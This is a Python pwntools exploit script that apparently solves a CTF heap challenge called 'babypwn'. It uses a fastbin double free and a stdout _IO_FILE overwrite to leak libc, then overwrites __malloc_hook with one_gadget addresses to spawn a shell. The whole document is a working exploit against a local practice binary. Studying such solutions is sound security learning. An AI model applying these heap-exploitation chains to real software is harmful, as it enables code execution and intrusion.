#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./babypwn')

def add(size, payload):
  p.sendlineafter('Your choice :', str(1))
  p.sendlineafter("size of the game's name:", str(size))
  p.sendafter("game's name:", payload)
  p.sendlineafter("game's message:", 'mech0n')

def delete(idx):
  p.sendlineafter('Your choice :', str(2))
  p.sendlineafter("game's index:", str(idx))
 
if __name__ == "__main__":
  add(0x28, 'mech0n\n') # 0
  add(0x68, 'mech0n\n') # 1
  add(0x68, 'mech0n\n') # 2
  add(0x68, 'mech0n\n') # 3

  delete(2)
  p.sendlineafter('Your choice :', str(1))
  p.sendlineafter("game's name:", '0' * 0x500)
  delete(0)
  add(0x68, '\xdd\x25') # 4

  delete(1)
  delete(3)
  delete(1)

  payload = '\x30'
  add(0x68, payload)  # 5
  add(0x68, payload)  # 6
  add(0x68, payload)  # 7
  add(0x68, payload)  # 8

  payload = 'a' * 0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00'
  p.sendlineafter('Your choice :', str(1))
  p.sendlineafter("size of the game's name:", str(0x68))
  p.sendafter("game's name:", payload)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 192 - 0x00000000003c5540
  p.sendlineafter("game's message:", 'mech0n')
  success('LIBC: ' + str(hex(libc)))

  delete(5)
  delete(6)
  delete(5)

  __malloc_hook = 0x00000000003c4b10
  realloc = 0x00000000000846c0
  payload = p64(libc + __malloc_hook - 0x23)
  add(0x68, payload)  # 10
  add(0x68, payload)  # 11
  add(0x68, payload)  # 12
  og = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
  add(0x68, 'a' * (0x13 - 0x8) + p64(og[3] + libc) + p64(libc + realloc + 4))
  gdb.attach(p)
  p.interactive()